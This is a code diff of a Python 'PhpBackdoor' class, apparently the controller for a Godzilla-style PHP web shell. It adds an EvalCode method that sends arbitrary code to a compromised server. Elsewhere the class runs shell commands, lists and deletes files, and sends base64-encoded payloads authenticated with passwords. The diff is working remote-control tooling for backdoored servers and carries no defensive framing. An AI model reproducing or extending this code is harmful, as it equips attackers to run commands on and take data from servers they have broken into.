@@ -38,13 +38,13 @@ class PhpBackdoor:
                     return True
 
     def RecvData(self):
-        # print(re.findall(r'<Spiriter>(.*)<Spiriter>', self.Text))
+        # write(re.findall(r'<Spiriter>(.*)<Spiriter>', self.Text))
         try:
-            #print(self.Text)
+            #write(self.Text)
             return Base64Decode(re.findall(r'<Spiriter>(.*)<Spiriter>', self.Text)[0])
         except Exception as error:
             #open("s.html","w").write(self.Text)
-            #print(self.Text)
+            #write(self.Text)
             print_error(error.__str__())
             return "<Error>"
 
@@ -85,7 +85,7 @@ class PhpBackdoor:
             self.ServerOs = 1
         else:
             self.ServerOs = 0
-            # print("Linux")
+            # write("Linux")
         # self.Exec()
     def GetFiles(self,Path="/"):
         Send ={
@@ -97,8 +97,17 @@ class PhpBackdoor:
         Recv = self.RecvData()
 
         return Base64Decode(Recv)
+    def EvalCode(self,Code):
+        Send ={
+            "methodName":"Eval",
+            "Code":Code
+        }
+        self.SendGodzillaPayload(self.MakePostData(Send))
+
+        Recv = self.RecvData()
+
     def ExecuteCommand(self,Command,Path="/"):
-        #print(Path)
+        #write(Path)
 
         if self.ServerOs==0:
             Base = PhpExecLinuxBashe%(Path,Command)
@@ -124,18 +133,18 @@ class PhpBackdoor:
                 "Comdline":Base
             }
 
-        #print(Send)
-        #print(self.MakePostData(Send))
+        #write(Send)
+        #write(self.MakePostData(Send))
 
         self.SendGodzillaPayload(self.MakePostData(Send))
         try:
             Recv= self.RecvData()
 
-            #print(Base64Decode(Recv))
+            #write(Base64Decode(Recv))
             Data=Base64Decode(Recv).split("[S]")
-            #print("s")
+            #write("s")
         except Exception as error:
-            print(error)
+            write(error)
         return Data
     def DelectDir(self,Dir,Path="/"):
         Send={
@@ -179,19 +188,19 @@ class PhpBackdoor:
 
     def SendGodzillaPayload(self, Pay):
         Payload = self.Payload(1)
-        #print(Pay)
+        #write(Pay)
         Send = {
             self.Password: Payload,
             self.PhpGodzillaPassword: str(Base64Encode(Pay))
 
         }
-        # print(Send)
-        #print(Send)
-        #print( self.SendData(Send))
+        # write(Send)
+        #write(Send)
+        #write( self.SendData(Send))
         RecvD=""
         try:
             RecvD = re.findall(r'<Spiriter>(.*)<Spiriter>', self.SendData(Send))
-            #print(RecvD)
+            #write(RecvD)
         except:
             print_error("Recv {}")
         return RecvD
